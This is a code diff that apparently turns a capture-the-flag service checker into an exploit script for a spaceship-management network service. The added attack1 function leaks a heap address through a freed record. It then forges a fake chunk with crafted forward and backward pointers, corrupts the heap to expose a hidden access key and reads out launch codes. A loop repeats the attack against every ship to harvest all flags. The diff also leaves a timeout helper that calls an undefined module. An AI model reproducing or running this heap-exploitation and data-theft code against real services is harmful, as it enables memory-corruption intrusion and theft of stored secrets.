@@ -1,16 +1,13 @@
 #!/usr/bin/env python3
 
-import subprocess as sp,sys,time,re
-import string,random
+import subprocess as sp,sys,time,re,string
+import threading
 from socket import *
 from struct import *
 idx_read = 0
-DEBUG = 0
-def id_gen(size=8, chars=string.ascii_uppercase + string.digits):
-    return ''.join(random.choice(chars) for x in range(size))
 def read_until(s,c):
     global idx_read
-    #print("Read idx %d"%idx_read)
+    print("Read idx %d"%idx_read)
     idx_read+=1
     cc = s.recv(1)
     mes=b""
@@ -21,8 +18,7 @@ def read_until(s,c):
         if len(cc)==0:
             break
     mes += cc
-    if DEBUG:
-        sys.stderr.write("<-"+str(mes))
+    print("<-",mes)
     try:
         return mes.decode()
     except:
@@ -30,13 +26,11 @@ def read_until(s,c):
 def send_mes(s,mes):
     if (type(mes) == type(b"a")):
         mes += b"\n"
-        if DEBUG:
-            sys.stderr.write("->"+str(mes))
+        print("->",mes)
         s.send(mes)
     elif (type(mes) == type("a")):
         mes += "\n"
-        if DEBUG:
-            sys.stderr.write("->"+str(mes.encode()))
+        print("->",mes.encode())
         s.send(mes.encode())
     else:
         print("Cannot encode")
@@ -72,10 +66,12 @@ def EditSpaceship(s,idx,name,launch,access,pilot_idx,\
     res+=read_until(s,b"\n")
     send_mes(s,"%s" %launch)
     res+=read_until(s,b"\n")
-    res+=read_until(s,b"\n")
-    send_mes(s,"%s" %access)
-    res+=read_until(s,b"\n")
-    res+=read_until(s,b"\n")
+    a=read_until(s,b"\n")
+    res += a
+    if "access" in a:
+        send_mes(s,"%s" %access)
+        res+=read_until(s,b"\n")
+        res+=read_until(s,b"\n")
     send_mes(s,"%d" %pilot_idx)
     res+=read_until(s,b"\n")
     res+=read_until(s,b"\n")
@@ -89,16 +85,15 @@ def EditSpaceship(s,idx,name,launch,access,pilot_idx,\
     res+=read_until(s,b">")
     return res
 def EditSpaceman(s,idx,name,password):
-    res=""
     send_mes(s,"8")
-    res+=read_until(s,b"\n")
+    read_until(s,b"\n")
     send_mes(s,"%d" %idx)
-    res+=read_until(s,b"\n")
+    read_until(s,b"\n")
     send_mes(s,name)
-    res+=read_until(s,b"\n")
-    res+=read_until(s,b"\n")
+    read_until(s,b"\n")
+    read_until(s,b"\n")
     send_mes(s,password)
-    res+=read_until(s,b">")
+    res=read_until(s,b">")
     return res
 def SpacemanAddr(s,idx):
     send_mes(s,"255")
@@ -171,81 +166,110 @@ def SearchSpaceship(s,tmp):
     read_until(s,b"\n")
     send_mes(s,tmp[:3])
     return read_until(s,b">")
+def quit_function(fn_name):
+    # print to stderr, unbuffered in Python 2.
+    print('{0} took too long'.format(fn_name), file=sys.stderr)
+    sys.stderr.flush() # Python 3 stderr is likely buffered.
+    thread.interrupt_main() # raises KeyboardInterrupt
+def exit_after(s):
+    '''
+    use as decorator to exit process if
+    function takes longer than s seconds
+    '''
+    def outer(fn):
+        def inner(*args, **kwargs):
+            timer = threading.Timer(s, quit_function, args=[fn.__name__])
+            timer.start()
+            try:
+                result = fn(*args, **kwargs)
+            finally:
+                timer.cancel()
+            return result
+        return inner
+    return outer
+#@exit_after(15)
+def attack1(proc,nam):
+    for i in range(9):
+        AllocSpaceman(proc,i,"df","sfda")
+    AllocSpaceman(proc,9,"df","sfda")
+    AllocSpaceman(proc,10,"df","sfda")
+    LoadSpaceship(proc,nam)
 
 
-#proc = sp.Popen("./serv12",shell=True,stdin=sp.PIPE,stdout=sp.PIPE)
+    #adr9=SpacemanAddr(proc,9)
+    #adr10=SpacemanAddr(proc,10)
+    #adr11=SpaceshipAddr(proc,0) + 40 + 48 - 8
+
+    EditSpaceship(proc,0,"","","",9,9,9,9)
+    #DumpAddr(proc,adr9,50)
+    DeleteSpaceman(proc,9)
+    #DumpAddr(proc,adr9,50)
+    a=ViewSpaceman(proc,9)
+    if type(a) != type(b''):
+        a = a.encode()
+    aa=re.findall(b'Name: (.+)\nShip',a)
+    aa[0] = aa[0] + b'\x00' * (8-len(aa[0]))
+    adr_f1 = unpack("<Q",aa[0])
+    print("Addr:",hex(adr_f1[0]+0x14500+560))
+    adr_f1 = adr_f1[0]+0x14500+560
+    AllocSpaceship(proc,1,"ZZzzzzzzzz")
+    for i in range(9):
+        DeleteSpaceman(proc,i)
+
+    a1 = b"a" * 0x0 # prev size
+    a1 += pack("<Q",0x80) # fake chunk size
+    a1 += pack("<Q",adr_f1)  # address of forward free
+    a1 += pack("<Q",adr_f1+8)# address of backward free
+    a1 += b'c' * (0x80-4*8) # fill
+    a1 += pack("<Q",0x80)  # prev chunk size
+    a1 += pack("<Q",0x90)  # chunk size, prev is free
+    a1 += b'd'*8
+    print("AfterEdit")
+    EditSpaceman(proc,9,a1,"")
+    #print(hex(adr9),hex(adr10),hex(adr11))
+    #DumpAddr(proc,adr9,12)
+    #DumpAddr(proc,adr10-32,12)
+    #DumpAddr(proc,adr11,12)
+
+    DeleteSpaceman(proc,10)
+
+    #DumpAddr(proc,adr9,12)
+    #DumpAddr(proc,adr10-32,12)
+    #DumpAddr(proc,adr11,12)
+
+    res=ViewSpaceship(proc,0)
+    print(res)
+    mkey = re.findall(r'Medic: ([0-9A-z]+)\n',res)
+    cnt = ViewLaunch(proc,0,mkey[0])
+    print(cnt)
+    res = re.findall(r'Launch code: ([0-9A-z=]+)\n',cnt)
+    return res # D1KHH7B6,J93RG46
+
+#proc = sp.Popen("./serv13",shell=True,stdin=sp.PIPE,stdout=sp.PIPE)
 proc = socket(AF_INET,SOCK_STREAM)
 proc.connect(('localhost',3777))
 
 res = read_until(proc,b"\n")
 res = read_until(proc,b">")
 
-if sys.argv[1] == 'check':
-    (u1,p1) = (id_gen(),id_gen())
-    (u2,p2) = (id_gen(),id_gen())
-    (u3,p3) = (id_gen(),id_gen())
-    (u4,p4) = (id_gen(),id_gen())
-    a1=AllocSpaceman(proc,0,u1,p1)
-    a2=AllocSpaceman(proc,1,u2,p2)
-    a3=AllocSpaceman(proc,2,u3,p3)
-    a4=AllocSpaceman(proc,3,u4,p4)
-    if DEBUG:
-        sys.stderr.write(a1)
-    if ("Successfuly allocated" not in a1 or \
-            "Successfuly allocated" not in a2 or \
-            "Successfuly allocated" not in a3 or \
-            "Successfuly allocated" not in a4 ):
-        exit(102)
-    (nam1,la1,acc1) = (id_gen(),id_gen(),id_gen(7))
-    a5 = AllocSpaceship(proc,0,nam1)
-    if "Successfuly" not in a5:
-        exit(102)
-    a6=EditSpaceship(proc,0,"",la1,acc1,0,1,2,3)
-    if "Successfuly set pilot" not in a6 or \
-        "Successfuly set medic" not in a6 or \
-        "Successfuly set engineer" not in a6 or \
-        "Successfuly set capitan" not in a6 :
-        exit(102)
-    (u5,p5) = (id_gen(),id_gen())
-    a7=EditSpaceman(proc,0,u5,p5)
-    a8=ViewSpaceship(proc,0)
-    if DEBUG:
-        sys.stderr.write(a8)
-    if "Pilot: %s" %u5 not in a8 or \
-        "Medic: %s" %u2 not in a8 or \
-        "Engineer: %s" %u3 not in a8 or \
-        "Capitan: %s" %u4 not in a8:
-        exit(102)
-if sys.argv[1] == 'put':
-    (u1,p1) = (id_gen(),id_gen())
-    (u2,p2) = (id_gen(),id_gen())
-    (u3,p3) = (id_gen(),id_gen())
-    (u4,p4) = (id_gen(),id_gen())
-    a1=AllocSpaceman(proc,0,u1,p1)
-    a2=AllocSpaceman(proc,1,u2,p2)
-    a3=AllocSpaceman(proc,2,u3,p3)
-    a4=AllocSpaceman(proc,3,u4,p4)
-    nam1 = id_gen()
-    acc1 = id_gen(7)
-    lac1 = sys.argv[4]
-    a5 = AllocSpaceship(proc,0,nam1)
-    a6=EditSpaceship(proc,0,"",lac1,acc1,0,1,2,3)
-    a7 = StoreSpaceship(proc,0)
-    a8 = SearchSpaceship(proc,nam1)
-    if nam1 not in a8:
-        exit(102)
-    print(",".join([nam1,acc1]))
-
-if sys.argv[1] == 'get':
-    nam1,acc1 = sys.argv[3].split(",")
-    flag = sys.argv[4]
-    a8 = SearchSpaceship(proc,nam1)
-    if nam1 not in a8:
-        exit(102)
-    a1 = LoadSpaceship(proc,nam1)
-    a2 = ViewLaunch(proc,0,acc1)
-    if flag not in a2:
-        exit(102)
-
+all_ships = []
+for i in string.ascii_uppercase:
+    aa=SearchSpaceship(proc,str(i))
+    res=re.findall(r'([0-9A-Z]{8})\n',aa)
+    for r in res:
+        all_ships.append(r)
+print(all_ships)
+flags = []
 proc.close()
-exit(101)
+for sh in all_ships:
+#    try:
+        proc = socket(AF_INET,SOCK_STREAM)
+        proc.connect(('localhost',3777))
+        res = read_until(proc,b"\n")
+        res = read_until(proc,b">")
+        r=attack1(proc,sh)
+        flags.append(r)
+        proc.close()
+#    except:
+#        print("No flag %s\n"%sh)
+print(flags)
